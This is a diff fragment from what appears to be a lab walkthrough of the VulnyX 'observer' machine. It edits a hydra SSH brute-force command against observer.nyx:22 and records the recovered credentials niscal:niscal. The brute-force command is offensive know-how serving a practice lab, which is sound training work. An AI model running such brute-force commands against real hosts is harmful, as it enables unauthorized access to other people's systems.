@@ -92,7 +92,7 @@ We created a wordlist using `cewl` that can be used to attempt a SSH brute-force
 By performing a brute-force attack we obtained valid SSH credentials `niscal:niscal`
 
 ```bash
-hydra -L wordlist.txt -P wordlist.txt ssh://observer.nyx:22 -u 
+hydra -L users.txt -P wordlist.txt ssh://observer.nyx:22 -u 
 ```
 ![image.png](/assets/img/observer_vulnyx/image%206.png)
 
